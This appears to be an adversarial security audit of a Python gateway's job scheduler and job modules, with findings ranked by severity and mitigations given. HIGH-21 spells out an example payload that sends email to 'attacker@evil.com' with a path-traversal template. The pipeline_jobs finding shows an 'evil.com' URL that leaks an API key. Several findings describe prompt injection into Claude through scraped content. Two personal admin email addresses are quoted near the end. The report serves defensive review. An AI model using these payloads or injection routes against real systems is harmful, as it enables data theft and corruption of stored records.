# Adversarial Audit — `gateway/scheduler/*` + `gateway/jobs/*`

**Scope:** APScheduler wrapper (`gateway/scheduler/`) and every Python file in `gateway/jobs/` (34 files).

**Focus vectors:**

1. Cron-name allowlist / name collision
2. `register_job` authentication / trusted-module gate
3. Tick re-entrancy (locking, overlapping runs)
4. Failed-job retry storm (exponential / unbounded retries)
5. Job-payload injection from DB without validation
6. Tangential issues caught while reading

**Severity legend:**

- **CRITICAL** — direct RCE, persistent data corruption, or unauthenticated privilege escalation.
- **HIGH** — exploitable from limited attacker position, or guaranteed prod-impact bug (jobs duplicating, retry storm, data leak).
- **MEDIUM** — defence-in-depth weakness; needs preconditions but realistic.
- **LOW** — code smell / hardening recommendation, not directly exploitable.
- **INFO** — observation, no action required.

---

## Cross-cutting findings (registry + scheduler design)

### HIGH-1 — `register_job` has **no authentication or module-trust gate**

`jobs/registry.py:20-27`

```python
def register_job(name: str) -> Callable[[_Fn], _Fn]:
    def deco(fn: _Fn) -> _Fn:
        if name in job_registry:
            raise ValueError(f"job already registered: {name}")
        job_registry[name] = fn
        return fn
    return deco
```

There is no allowlist of trusted modules. **Any module the gateway imports — at any depth — can shove an arbitrary coroutine into `job_registry` simply by calling `@register_job("send_email")` (if the name weren't taken) or any unused name.** Once registered, `enqueue_job(name, **kwargs)` will dispatch it.

Attack model that works today:

1. A dependency or admin-uploaded payload causes any Python module to be imported.
2. The module decorates a coroutine with `register_job("totally_legit_name")`.
3. Anywhere the codebase later calls `enqueue_job("totally_legit_name", ...)` — including the admin retry path (`/admin/jobs/{id}/retry`) which re-enqueues by job-name from the DB row — that coroutine runs with the gateway's privileges.

Compounding factor — the **name collision check is the only gate** (`raise ValueError`). Because `jobs/__init__.py` swallows every import error (lines 41-132 use `try/except Exception` around every module import), a `ValueError("job already registered: …")` raised during import will silently kill the offending module's registrations without crashing the gateway. An attacker who controls the import order can pre-register a job under a known name before the legitimate module loads, and the legitimate registration will be the one that fails — silently. The attacker now owns that job-name.

Mitigation: gate `register_job` on `fn.__module__` matching an explicit allowlist (e.g. `startswith("jobs.")`), and fail loud (raise → process exits) on any duplicate registration in production.

### HIGH-2 — Two modules register the same job name `check_daily_claude_spend`

- `jobs/ai_jobs.py:252` — `@register_job("check_daily_claude_spend")`
- `jobs/claude_cost_check.py:50` — `@register_job("check_daily_claude_spend")`

`jobs/__init__.py:103-132` imports `claude_cost_check` **after** the implicit ordering above (`ai_jobs` would normally land first because there's nothing forcing `claude_cost_check`'s import). The second decorator raises `ValueError("job already registered: check_daily_claude_spend")`, the surrounding `try/except` in `jobs/__init__.py:128-132` swallows it as a warning, and **one of the two implementations is silently never reachable.**

Worse: which one wins is import-order dependent (and pytest's collection order can flip it). The cron schedule registered by the loser still exists in `cron_jobs` — so the legacy `_cron_loop` (when enabled via `NARVE_LEGACY_CRON_LOOP=1`) will fire the cron entry, look up the registered function (the winner's), and run it with the **loser's schedule**. That's deeply confusing for incident response.

The two implementations differ materially: `ai_jobs.py` only logs an alert and writes to `security.audit`. `claude_cost_check.py` writes to `claude_cost_alerts`, emails admins, and trips a `kill_switch` at 200 USD. **Losing the latter is a real prod risk** — a runaway Claude spend day silently wouldn't trip the kill switch.

### HIGH-3 — `enqueue_job` accepts arbitrary kwargs, no schema validation per job

`jobs/backend.py:147-153` (InProcess) and `jobs/backend.py:266-270` (Arq):

```python
async def enqueue(self, name: str, **kwargs) -> int:
    if name not in job_registry:
        raise ValueError(f"unknown job: {name}")
    job_id = _audit_insert(name, kwargs)
    asyncio.create_task(self._run(job_id, name, kwargs))
```

`_audit_insert` calls `json.dumps(payload, default=str)`. Then `retry_job` (line 335-346) re-reads the payload from the DB and calls `enqueue_job(row["name"], **payload)`. **There is no per-job kwargs schema** — every job's parameter list is its own informal contract, and the retry path round-trips arbitrary attacker-supplied JSON through `**kwargs`.

Concrete examples of how this turns into a problem:

- `send_email_job(to, template, context, reply_to, tags)` — `template` is the email template name; a crafted `template` value can be `"../../etc/passwd"` if the renderer naively `Path.join`s it. (See email_system audit for the rendering side; the job layer itself does no allowlist.)
- `send_market_resolution_notifications(market_slug, outcome, ...)` — `market_slug` is interpolated into URLs and emails verbatim (`notification_jobs.py:67`, `:84`). HTML-context escaping happens downstream but `tag=f"market-resolved-{market_slug}"` is used as a Web Push tag — a long crafted slug can balloon push payloads.
- `send_push_notification(user_id, title, body, url, tag, data)` — `data` is a free-form dict shipped to the push service; no size cap, no key allowlist.
- `send_market_resolution_notifications` and others read `market_slug` directly back into SQL: `notification_jobs.py:39, :73` are parameterised but `:67` builds a URL `https://polymarket.com/event/{market_slug}` — if that ever feeds an open-redirect, slug control is enough.
- `process_referral_rewards` — `row["referred_email"]` is shipped into the email context (`referral_jobs.py:265`). Trusts the DB row, which originally came from user input at signup.

The deeper issue: **any path that writes a row into `background_jobs` with attacker-controlled `payload` becomes a stored-RCE pivot** because `retry_job` will re-dispatch it. The admin retry button (`/admin/jobs/{id}/retry` — see `admin_jobs_routes.py`) is the obvious exposure. If admin auth were ever bypassed (or a CSRF hole opened), an attacker who can write a `background_jobs` row + trigger retry runs arbitrary registered jobs with arbitrary kwargs.

Mitigation: per-job pydantic schema, validated at `enqueue` time and at `retry` time. Reject jobs whose `payload` JSON doesn't validate.

### MEDIUM-4 — APScheduler `max_instances=1` is the only overlap guard; the **wrapper has no app-level lock**

`scheduler/scheduler.py:122-133, 137-162, 211-214`. Every job is registered with `max_instances=1`, which is APScheduler's per-job concurrent-firing limit. That covers the **same-process** case: a job that takes longer than its interval will simply skip the next tick. But:

- Leader election is `NARVE_SCHEDULER_LEADER=1` env-var, set per worker (`scheduler.py:225-252`). The docstring acknowledges this is "deliberately primitive". A misconfiguration (`=1` on two workers, or two processes that both default to the implicit on) **runs every job twice per minute** — `replenish_invites` fires twice, granting users 2× the monthly allotment; `process_referral_rewards` could double-grant a reward despite the `mark_referral_reward_granted` atomic check (the second grant is "orphan-revoked" but only if the second run sees the first's commit — race window present); `process_scheduled_deletions` could double-cascade.
- There is no DB-level "this job is running" advisory lock. With two scheduler leaders on the same SQLite file, two simultaneous `vacuum_db_daily` runs will both call `VACUUM`, which holds an exclusive lock — the second blocks until the first finishes, then runs immediately, doubling the window of locked-DB. Same for `recovery_drill`.
- **`legacy cron_loop` and APScheduler can both be active** if `NARVE_LEGACY_CRON_LOOP=1` is set on the leader (`backend.py:188-196`). The codebase ships with that env-var unset, but a "rollback" instruction in the comment says to set it. If an operator sets it without disabling APScheduler, every job fires twice from the leader plus optionally on each other worker. The status-check job (`check_service_health`) firing 6× a minute will tear up `status_snapshots`.

### MEDIUM-5 — Retry storm via in-process backend

`jobs/backend.py:155-179`:

```python
max_attempts = 3
attempt = 0
while attempt < max_attempts:
    attempt += 1
    _audit_start(job_id)
    try:
        result = await asyncio.wait_for(fn(**kwargs), timeout=300)
        ...
    if attempt < max_attempts:
        await asyncio.sleep(2 ** attempt)
```

Each `_audit_start` increments `attempts` on the row. Backoff is `2^attempt` (4s, 8s) — fine for one job. But:

- **Cron jobs that fail every tick generate a constant retry stream.** `check_service_health` fires every minute; if its DB connection is broken, every minute spawns a 3-attempt × 300s timeout = up to 12-min stuck task. After 60 minutes you have ≤60 stuck tasks (bounded by the `asyncio.Semaphore(10)` at `backend.py:143`, so effectively 10 concurrent + queue of 50). The semaphore prevents unbounded resource consumption but during a real outage the queue holds dozens of `check_service_health` retries, each writing rows into `job_runs` AND `background_jobs`. The 30-day retention via `trim_job_runs` keeps it bounded, but `/admin/jobs` polling cost spikes.
- **Self-re-enqueue jobs amplify retries.** `notification_jobs.py:93, :252` and `affiliate_jobs.py:122` re-enqueue themselves when a batch saturates. If the re-enqueued job fails 3× and gets re-enqueued by its predecessor that succeeded just enough to call `enqueue_job` before raising, you can get a runaway. Mitigation today is loose: there's no max-depth on self-re-enqueue, no recursive call counter.
- **`forecast_sync` calls 4 external providers (Metaculus, Manifold, etc.) in one job run.** If three fail, the 3-retry backoff means we hit each provider 3× per scheduled run. The job runs daily so it's bounded, but a "retry from admin" button on a failed run multiplies.

ARQ backend has its own retry config (`worker.py:96-97`: `retry_jobs=True, max_tries=3`) — same shape.

### MEDIUM-6 — Job payloads round-trip JSON via `json.dumps(payload, default=str)` — type erasure

`jobs/backend.py:74` and `retry_job` at `:335-346`:

```python
c.execute("INSERT INTO background_jobs ... VALUES (?, ?, ...)", (name, json.dumps(payload, default=str), ...))
...
payload = json.loads(row["payload"] or "{}")
await enqueue_job(row["name"], **payload)
```

`default=str` coerces non-JSON types (datetime, set, custom objects) to strings. On retry, **those become strings instead of their original types**. Jobs that took a `datetime` argument and retried after a failure now receive a string, which may pass through int(...) but breaks comparison logic. Not a direct security issue, but it means retries are silently lossy — a bug that masks itself.

### LOW-7 — `triggered_by` not validated

`scheduler/scheduler.py:271-279`:

```python
def trigger_now(self, name: str, triggered_by: str = "admin") -> None:
    self._pending_trigger_reasons[name] = triggered_by
    self._impl.modify_job(name, next_run_time=...)
```

`triggered_by` flows into `job_runs.triggered_by` (`record_start` at `scheduler.py:49-58`) which is written into the audit log. Caller-supplied; if `/admin/jobs/{name}/trigger` lets the admin pass a free-text reason, the audit-log column accepts arbitrary text. Not exploitable but means audit-log integrity depends on trusting every caller.

### LOW-8 — `_cron_from_legacy` shifts arq weekday → cron weekday with `(v + 1) % 7`

`scheduler/registry.py:51-56`:

```python
if is_weekday:
    return str((v + 1) % 7)
```

arq.cron uses `0=Mon`. Classic cron uses `0=Sun, 1=Mon`. The shift maps:

- arq 0 (Mon) → cron 1 (Mon) ✓
- arq 6 (Sun) → cron 0 (Sun) ✓

Looks correct. But APScheduler `CronTrigger` accepts ranges and lists too — and any legacy entry that omitted `weekday` gets `"*"` (fine). No bug, but the shift is silent: if a future legacy registration uses a weekday range string (rather than int), `_field` returns `"*"` because it's not None and isn't a known type. Brittle.

### LOW-9 — `_wrap_legacy_job` swallows raises into APScheduler log only

`scheduler/registry.py:65-81`. The wrapped runner pulls from `job_registry` at fire-time and raises `RuntimeError` if missing. The outer scheduler wrapper (`scheduler.py:174-206`) catches and logs. Fine for resilience, but means **a typo'd cron name silently never runs**. Operationally this is a "where's my data?" trap. Better: assert at `register_all()` time that every cron entry's name exists in `job_registry`.

### INFO-10 — `recovery_drill` opens DB file via `sqlite3.connect(drill_path)` without `uri=True`

`jobs/db_maintenance.py:362-369`. The drill path comes from `tempfile.NamedTemporaryFile(prefix="drill_", suffix=".db")` — attacker-controlled would require write access to `/tmp`, which is already a much bigger problem. Fine as-is.

---

## Per-file findings

### `gateway/scheduler/__init__.py`

INFO-11 — Re-exports `scheduler`, `record_start`, `record_end`, `scheduled_job`. Pure surface. No issues.

### `gateway/scheduler/scheduler.py`

- HIGH-2 (above) — applies here via the wrapper.
- MEDIUM-4 (above) — leader-election + max_instances mechanism lives here.
- LOW-12 — `_now()` returns `int(time.time())`. Clock skew on the host affects `started_at`/`completed_at`. Not security, but `duration_ms = max(0, (completed - started_at) * 1000)` (`scheduler.py:73`) means **a leap-second backwards clock walk yields duration=0**, hiding real perf regressions in the audit log. Negative durations now masked.
- LOW-13 — `record_end` line 87: `(error or "")[:2000]` truncates at 2000 chars. A crafted exception (long stack trace) can't smuggle anything dangerous through the audit log, but the truncation point is mid-line — partial JSON in the error message becomes invalid. Cosmetic.
- MEDIUM-14 — `wrapped` closure at `:174-206` is the only crash-isolation. If a sync job (run via `run_in_executor` at line 191) raises a `SystemExit` or `KeyboardInterrupt`, the broad `except Exception` does **not** catch it — those would propagate and tear down APScheduler. Realistic only with malicious code in the job, but combined with HIGH-1 above (attacker can register a job that does `raise SystemExit`), this is a process-kill primitive.
- INFO-15 — `add_job(..., replace_existing=True, ...)` at line 211 means **calling `register_all()` twice replaces every job's APScheduler entry**, dropping the previous job's next-run time. A pause via `pause_job` survives the replace (APScheduler stashes that in the job store), but `triggered_by` reasons in `_pending_trigger_reasons` are dict keys — surviving fine. Documented in docstring; no bug.

### `gateway/scheduler/registry.py`

- HIGH-1 (above) applies — `register_all` imports `jobs` which fires every `@register_job` and `register_cron` indiscriminately.
- LOW-8 (above).
- LOW-9 (above).
- MEDIUM-16 — `_try_import` swallows ImportError so missing modules "no-op" (`registry.py:171-181`). A typo in `__import__("jobs.status_jobs", fromlist=["check_service_health"])` silently disables the spec-wired health check. There's no startup sanity test that **every spec-wired job actually got wired**. Adding a `len(scheduler.jobs) >= 30`-style smoke test at startup would catch this.

### `gateway/scheduler/decorators.py`

- INFO-17 — `_pending` is module-level mutable state. Pytest re-imports break this if `drain_pending` isn't called. The comment at `registry.py:91` ("Drain any @scheduled_job decorators that have already fired") is correct but the drain is only run once per `register_all`. Multiple `register_all()` calls (admin reload?) would lose pending registrations between the first drain and the next decorator firing. No callers do that today.

### `gateway/jobs/__init__.py`

- HIGH-1 (above) — `jobs/__init__.py` imports a hardcoded list of modules. **The list is the de-facto allowlist.** But `jobs.registry.register_job` doesn't enforce that the calling module is on the list — any later `import jobs.foo` from anywhere registers `foo`'s jobs. There's no module-of-record check.
- LOW-18 — Every defensive import wraps `try/except Exception` and `_l.warning("%s import failed: %s", _e)`. A flood of import errors in prod (broken dep) would generate ~12 warning lines per gateway start. Manageable; flagging only because debugging a totally-broken jobs subsystem from logs is annoying — better to surface an aggregate count.
- MEDIUM-19 — `claude_cost_check` is in the optional list (line 104) **after** `ai_jobs` is unconditionally imported (line 29-34 implicitly via the chain). This is the source of HIGH-2's import-order ambiguity.

### `gateway/jobs/registry.py`

- HIGH-1 (above) — `register_job` has no trusted-module gate.
- MEDIUM-20 — `cron_jobs` is a list, not a set keyed on `(name, minute, hour, weekday, day)`. Duplicate `register_cron("foo", minute=5)` calls add a duplicate entry. `_cron_from_legacy` / `scheduler/registry.py:124-134` dedupes on a fingerprint at adapter time, but the legacy `_cron_loop` (still alive behind `NARVE_LEGACY_CRON_LOOP=1`) **runs every duplicate**. If a module is import-twice-d during a hot reload, every cron entry fires twice per tick.

### `gateway/jobs/backend.py`

- HIGH-3 (above) — kwargs are passed through `**` with no schema validation.
- MEDIUM-5 (above) — retry storm bounded by semaphore but persists during outages.
- MEDIUM-6 (above) — JSON type-erasure on retry.
- HIGH-21 — `retry_job` calls `enqueue_job(row["name"], **payload)` **without re-checking that the payload conforms to anything**. An attacker who manages to write a row to `background_jobs` directly (via any SQL-injection path) and then triggers the admin retry endpoint runs that job. This is the post-exploit pivot from any SQLi: write a `background_jobs` row with `name='send_email'`, `payload='{"to":"attacker@evil.com","template":"../../etc/...","context":{}}'`, click retry. The retry endpoint must read-only re-enqueue an **already-vetted** row, not allow ad-hoc DB rows. Mitigation: a HMAC over `(name, payload, enqueued_at)` written at insert time and verified at retry.
- LOW-22 — `_audit_finish` (`backend.py:87`) reads `row["started_at"]` — if a job was never `_audit_start`-ed (e.g. enqueue succeeded, then process crashed before `_run` ran), `started_at` is NULL and `duration_ms` becomes None. Fine; flagging because tests that rely on duration would be flaky.
- MEDIUM-23 — `_cron_loop` (lines 208-237) walks `cron_jobs` in order on every minute. **No protection against a job's `enqueue` hanging** — `await self.enqueue(job["name"])` only returns after `_audit_insert` writes to SQLite. If SQLite is locked (e.g. VACUUM in flight), `enqueue` blocks the entire cron loop, missing every other cron entry for that minute. APScheduler has the same issue but at least logs missed runs.
- INFO-24 — `_select_backend` global caches the backend (`_backend`). Once selected, env-var changes don't take effect. Documented behaviour; flagging because tests that swap `REDIS_HOST` between tests need to reset `_backend`.

### `gateway/jobs/worker.py`

- LOW-25 — `WorkerSettings.cron_jobs = _as_arq_cron()` is evaluated at import time. **The job_registry has to be fully populated before this class body runs.** It is (lines 32-33 import `email_jobs, notification_jobs, pipeline_jobs` first), but only those three — every other job module is skipped, so the ARQ worker is **missing 30+ cron entries.** If anyone deploys with `REDIS_HOST` set, the ARQ worker silently runs <10% of the cron load.
- HIGH-26 — `WorkerSettings` lines 88-100 set `keep_result = 3600` and `retry_jobs = True, max_tries = 3`. ARQ stores results in Redis. There's **no encryption-at-rest** mention; Redis dumps include payloads. If Redis is exposed (any operator-misconfig), every job's input + output history is readable. That includes:
  - email payloads (recipient + template context — which includes user IDs, "watermark" hashes, predictions, market data)
  - prediction texts
  - SIWE nonces (no, those are wiped on use, but)
  - the JSON blob from `reconcile_subscriptions` which contains `subproduct_subscriptions` (stripe IDs!)
  - the dict payload from `send_telegram_alert` which is the message text.

Not directly exploitable today (Redis isn't set), but the moment `REDIS_HOST` lands, this is a soft-secret leak surface. Mitigation: enforce Redis AUTH + TLS at deploy time, and document the data classification.

### `gateway/jobs/email_jobs.py`

- HIGH-3 (above) — `send_email_job(to, template, context, ...)` has no schema; `template` is the email template name and is **not allowlisted** at the job layer. The downstream `EmailService.send_template` presumably allowlists templates, but a defence-in-depth check here would catch escapes.
- MEDIUM-27 — `send_weekly_digest_batch` (line 128-303) reads every user row that opted in and **fans out one job per user**, capped by SQL but not by an explicit safety net. With 1M users, that's 1M enqueued jobs per Monday morning. `_audit_insert` writes one row each. SQLite's per-row write contention plus the in-process `Semaphore(10)` will work, but the WAL will balloon and the digest takes hours. Stage-out: chunk the user list and let each chunk re-enqueue its tail (the `feedback_digest` pattern at lines 39-41).
- MEDIUM-28 — Line 151-157 query: `SELECT u.id, u.email, u.username, u.email_digest, u.email_unsubscribed_at FROM users u WHERE COALESCE(u.email_digest, 1) = 1 AND u.email_unsubscribed_at IS NULL AND COALESCE(u.is_deleted, 0) = 0`. **No tier filter at the SQL level** — every opted-in user enters the in-Python filter loop. The N+1-fix block then re-queries to find admin/plan/subproduct. Fine for correctness; flagging because if an attacker were to spam-create users that get past account-create rate limits, they could blow up the digest run time linearly.
- MEDIUM-29 — `unsubscribe_url` injection — line 289: `_unsub_url(u["id"], u["email"], "digest")` builds an unsubscribe URL using a HMAC token, but `u["email"]` is the column from the DB which is itself user-controlled. If the unsubscribe URL builder embeds the email verbatim and the renderer doesn't escape, you have an HTML-injection in every digest email. (See email_system audit.)
- MEDIUM-30 — Line 293 `watermark.annotate_context(context, u["id"], "weekly_digest", batch_ts=now)` — the watermark module ostensibly fingerprints emails for leak forensics. The watermark is **not part of the schema** of the email rendering layer per the inline comment, so if it's exposed in the rendered HTML (visible markers), the digest leaks user-IDs.
- LOW-31 — `morning_briefing` (`:306-542`) creates and immediately closes httpx clients per run (lines 343-352, 354). Fine; flagging because if PolymarketClient or KalshiClient fails to close (e.g. raises mid-fetch), connections leak. The wrapping `try/except` catches the fetch but the `await poly.close()` lines are inside the try block and don't run on failure.

### `gateway/jobs/notification_jobs.py`

- HIGH-3 (above) — `send_market_resolution_notifications(market_slug, outcome, market_question, batch_size)` takes a raw `market_slug` from the caller, interpolates it into URL (line 67) and Web Push tag (line 84) without validation. The caller in `resolution_jobs.py:114-118` derives `market_slug=slug` where `slug = market_id[5:]` for `poly:slug` — slug comes from `db.get_unresolved_market_ids()` which itself comes from `predictions.market_id` — which the scraper or admin writes. **An attacker who controls a prediction row's `market_id` controls the notification URL.** Not a stored-XSS today (URL goes into href + Push payload, no inner HTML), but combined with an upstream allow of `javascript:` schemes anywhere, it's a hop.
- HIGH-32 — `send_market_resolution_notifications` re-enqueues itself unconditionally when `len(rows) == batch_size` (line 92). If batch_size=100 and there are exactly 100 unnotified viewers, it re-enqueues even when the next batch is empty. Inefficient (one wasted job) but not exploitable. **The exploit:** if `mark notified` fails silently (the `try/except` at line 87-88 catches it), the same 100 rows return next tick and we re-enqueue forever, generating an infinite-loop send. Email rate limits would catch it but it'd be a budget-burn. Mitigation: check that **at least one row's notified_on_resolution flipped to 1** before re-enqueueing.
- MEDIUM-33 — `_fanout_push_safe` (`:139-166`) builds an asyncio task via `asyncio.ensure_future` inside a sync function and **never awaits the result**. Fire-and-forget is fine, but the docstring claims "swallows errors" — except `enqueue_job` itself is async and the task might be created against the wrong event loop if `_fanout_push_safe` is called from non-async context. Dead code path today (callers in this file all use `await enqueue_job` directly), but the helper is exposed and a future caller could hit the loop-mismatch.
- MEDIUM-34 — `check_market_movers` (`:259-403`) fetches markets every hour for every opted-in user (broadcast model, no per-user fan-out efficiency). If `notify_email` flag is checked but no `tier` filter is applied (line 299), free-tier users get market-mover emails. Cross-check `email_system/access.py` if it exists.
- LOW-35 — `correct_count` / `total_count` from line 46-48 leak across users — the iteration over `rows` (line 51) uses the same `correct_count` for every user (the predictions for the market). That's correct semantically (the market has one outcome) but the variable's positioned outside the loop, easy to misread as per-user.

### `gateway/jobs/pipeline_jobs.py`

- HIGH-3 — `run_pipeline` POSTs to `SCRAPER_URL` with `SCRAPER_API_KEY` as Bearer. `scraper_url` is `os.environ.get("SCRAPER_URL", "").strip()` — env-controlled, fine. **But** the URL is f-stringed into `f"{scraper_url.rstrip('/')}/pull"`. If `scraper_url` is `https://evil.com/?x=`, the call becomes `https://evil.com/?x=/pull` — the API key bearer header is sent to evil.com. SSRF via env var, requires controlling the env. Acceptable today; flag as "minimum hardening: validate scheme + host".
- HIGH-36 — `process_scheduled_deletions` (`:38-104`): **cascades manual `DELETE FROM` across 10 tables in a single connection but `db.conn()` opens a new connection per `with` block**. The `UPDATE users SET email = ...` and the cascading deletes are NOT in one transaction. If the process crashes between lines 76 and 86, the user is anonymised (`email = deleted_X@…`) but their `sessions`, `password_resets`, etc. are still present. The next run re-checks `deletion_scheduled_for <= now AND deletion_cancelled_at IS NULL AND is_deleted = 0` — but `is_deleted = 1` after the anonymise step, so the user is **skipped on the next run**, leaving orphan rows forever. Mitigation: single transaction (one `with db.conn() as c:` wrapping everything), or `is_deleted` flip last.
- HIGH-37 — `process_scheduled_deletions` line 92 enqueues a final email to `old_email` (the pre-anonymisation address) — fine. But this email is **enqueued inside the cascading-delete block** (line 92, while the `with db.conn()` is open). If `enqueue_email` raises (e.g. job backend down), the outer `try/except` catches and continues. So the deletion is "complete" but no audit row was written for the email failure. The deletion ledger has a hole.
- HIGH-38 — `generate_sitemap` (`:107-154`): line 152-153 writes to `Path(__file__).parent.parent / "static" / "sitemap.xml"`. **No tempfile + rename** — a concurrent reader (CDN poll, web request) can see a half-written file. Probability is low but exists. Also: `xml = "\n".join(parts)` where `parts` includes `f"<url><loc>{base_url}{url}</loc>...` — `base_url` is hardcoded but the source URL list comes from `db.list_all_source_credibilities()` which feeds `s["source_handle"]` straight into the XML. **If a source handle contains a `<` or `&`, the sitemap is malformed XML.** Worse, if a handle could contain a `]]>` or `</url>` sequence, an attacker who owns a source could inject sitemap entries (e.g. linking to attacker-controlled URLs that look like narve URLs). Mitigation: `xml.sax.saxutils.escape` on every interpolated value.
- HIGH-3 — `run_backtest_job(backtest_id)` (`:157-189`): reads `params` from `backtests.params` and does `_json.loads(row["params"])`. **The `params` dict is fed into `run_backtest(params)`** with no validation. If the backtest engine takes file paths, db queries, or shell args from params, this is an RCE primitive. Need to read `intelligence.backtester.run_backtest` for the actual surface.
- MEDIUM-39 — `recompute_credibilities` (`:192-204`) is registered 4× a day (`:220-223`). Bayesian recompute runs over ALL sources. If two recompute runs overlap (a long previous run + a new tick), they race against `source_credibility` rows. APScheduler's `max_instances=1` protects within the same process; if there's a worker leader misconfig (MEDIUM-4 above), two processes recompute simultaneously and last-writer-wins corrupts scores.
- INFO-40 — `poll_whale_positions` is a black-box import; not auditable here.

### `gateway/jobs/resolution_jobs.py`

- HIGH-41 — `poll_market_resolutions` reads `market_id` from `db.get_unresolved_market_ids()` and interpolates `slug = market_id[5:]` (line 63). Calls `poly.get_market(slug)` — an HTTP fetch. **No length cap on slug, no charset check.** If a malicious row has `market_id = "poly:..."` with embedded `\r\n`, the HTTP client (httpx) **should** sanitize but if the slug is interpolated into a path, request-smuggling could be possible. httpx escapes properly; flag as "verify but probably ok".
- HIGH-42 — line 71: `outcome_str = (raw.get("outcome") or "").upper()`. `raw` is the JSON response from Polymarket. If Polymarket returns `outcome="YES evil"`, the upper-case still equals `"YES EVIL"`, then `if outcome_str in ("YES", "1")` fails and we fall through to outcomePrices. Not exploitable. But:
- HIGH-43 — `resolved_prices = raw.get("outcomePrices")` (line 73): the **historical comment** at line 79-86 explicitly documents that this **used to be `eval()` and was an RCE**. The fix (json.loads) is correct now. **Audit confirms the fix is in place.** Verifying: line 89-91 → `if isinstance(resolved_prices, list): prices = resolved_prices else: prices = json.loads(resolved_prices)`. Safe.
- MEDIUM-44 — `poll_market_resolutions` runs every hour. If a Polymarket or Kalshi outage causes every call to raise, the per-market `try/except` (line 60-164) keeps going but every market's request hits the broken API. With ~200 unresolved markets that's 400 failed calls/hour. Mitigation: circuit-break the upstream client after N consecutive failures.
- MEDIUM-45 — `generate_resolution_retrospective(market_id, outcome, market_question)` (line 190-211) — three string params, all flow into `intelligence.retrospective.generate_retrospective` which presumably prompt-injects into Claude. **`market_question` is attacker-controllable** (scraper-derived). Prompt-injection that flips the LLM's behaviour is plausible.

### `gateway/jobs/ai_jobs.py`

- HIGH-2 — name collision with `claude_cost_check.py`.
- HIGH-3 — `run_extract_for_recent_posts(posts, limit)` accepts a free-form `posts` list (`:39-44`). Each post is a dict with `content, author_handle, post_id, source_url`. All four flow into the Claude prompt and into `db.create_prediction(...)`. **If `posts` is fetched from a job-retry row, an attacker who can write to `background_jobs.payload` can stuff an arbitrary post into Claude's input** — prompt injection. The scraper service is the legitimate source and posts a list of fresh posts via... actually unclear from this code; need to find caller. The cron entry at line 306-308 fires with no args, so `posts=None → batch = []` → no-op. The exploitable path is only via direct enqueue.
- HIGH-46 — `reextract_all_predictions(chunk_size)` (`:106-182`): scans `predictions` rows and feeds them to Claude. **`predicted_probability` from the DB is used for comparison but `claim`, `explicit_probability`, `time_frame`, `contains_sarcasm`, `is_conditional` from the Claude payload are inserted into `predictions_reextracted` raw**. If Claude's response is attacker-influenced (prompt injection via `content`), the staged diff carries the injected values. Downstream consumers (`apply_reextraction_switchover`) propagate them to `predictions`. End-to-end content corruption.
- MEDIUM-47 — `categorise_uncached_markets` calls `fetch_unified_markets(PolymarketClient(), KalshiClient())` (`:200`) without proper close. The clients are leaked unless `fetch_unified_markets` closes them internally. Resource leak.
- INFO-48 — `regenerate_stale_source_summaries` is straightforward.

### `gateway/jobs/ai_maintenance.py`

- INFO — does not call `register_job` outside the `jobs.` prefix; uses its own `_connect()` with `sqlite3.connect(_db_path())` rather than `db.conn()`, bypassing the connection pool and the SQLite settings (WAL, busy_timeout) the pool sets. Functional but inconsistent.
- MEDIUM-49 — `recompute_calibration_scores` (`:79-168`) hits `sources` table with dynamic UPDATE SQL: `f"UPDATE sources SET {', '.join(fields)} WHERE handle = ?"`. `fields` is constructed from a whitelisted-column dict (line 91-93, 114-117), so safe from injection. **But** `fields` can be empty if `calib_col is None` is false but the only field is unlocked_col (line 132). An empty `fields` list yields `"UPDATE sources SET  WHERE handle = ?"` — syntax error. Currently impossible (calib_col gate ensures at least one field), but fragile.
- HIGH-50 — `reextract_predictions_backfill` (`:178-238`): reads `predictions` rows, calls `extractor.extract_predictions_from_post(row["content"], post_id=str(row["id"]))` — **post_id is `str(row["id"])` which is safe**. But `row["content"]` is fed to Claude raw. Same prompt-injection vector as above. The result is **staged to `predictions_reextracted`** via `_stage_diff` (`:241-289`). Line 264 inserts `new.get("category"), (new.get("direction") or "").upper() or None, new.get("explicit_probability"), ...` — **these come from Claude's response** which could be manipulated by the prompt-injected content. The diff stage is a quarantine area, **but if a future admin "approve all diffs" button lands**, those poisoned values propagate to `predictions`.

### `gateway/jobs/affiliate_jobs.py`

- MEDIUM-51 — `calculate_affiliate_commissions` (`:35-126`) — `commission_pence = int(round(first_payment * rate))`. `rate` is `float(row["commission_rate"])` from `affiliate_accounts` (set by admin). If `rate` ever exceeds 1.0 by a bug or admin error, we **pay out more than the customer paid**. No upper-bound assertion. Fix: `assert 0 < rate < 1` or clamp.
- MEDIUM-52 — `_enqueue_threshold_email` (`:129-163`) uses `aff["payout_email"] or user["email"]`. **`payout_email` is user-controlled** (the affiliate sets it). If an attacker registers as an affiliate and sets `payout_email = "victim@target.com"`, they receive threshold emails about their own payout — innocuous in itself. **But** the email contains pending balance amounts; a leaked email reveals affiliate earnings. Minor.

### `gateway/jobs/backtest_jobs.py`

- HIGH-3 (above) — `run_backtest_job(run_id)` takes an int run_id, casts via `int(run_id)`. The `_bt.run_backtest(int(run_id))` is called. **If `run_id` is `"0; DROP TABLE backtests"`, `int(...)` raises ValueError**, caught by the outer `except Exception`. Safe. But the duplicate registration with `pipeline_jobs.py:157` (`@register_job("run_backtest")`) is a **NAME COLLISION** — `pipeline_jobs.run_backtest_job` registered first wins; `backtest_jobs.run_backtest_job` raises ValueError on import and gets silently dropped by `jobs/__init__.py:128-132`'s try/except.

**Wait — confirm:** `pipeline_jobs.py:157` registers `run_backtest` taking `backtest_id`. `backtest_jobs.py:20` registers `run_backtest` taking `run_id`. Two callers, two signatures. Whichever wins gets called by every `enqueue_job("run_backtest", ...)`. The other implementation is dead. The win order depends on import order in `jobs/__init__.py`. Today: pipeline_jobs imports first (line 33), so it wins; backtest_jobs is imported later via `for _mod in ("...backtest_jobs", ...)` (line 109). **backtest_jobs.py's job is dead code.** This is a high-severity bug.

- HIGH-53 — Duplicate registration `run_backtest` between `backtest_jobs.py:20` and `pipeline_jobs.py:157`. One signature is `(run_id)`, the other `(backtest_id)`. The dead one is silently skipped.

### `gateway/jobs/claude_cost_check.py`

- HIGH-2 (above) — name collision with `ai_jobs.py`.
- MEDIUM-54 — `ADMIN_EMAILS` defaults to `"julian.habbig@icloud.com,shocakarel@gmail.com"`. Hardcoded admin emails in source. Acceptable for a single-tenant SaaS; flag because rotating an admin requires a deploy. Better: read from a DB-backed admin table.
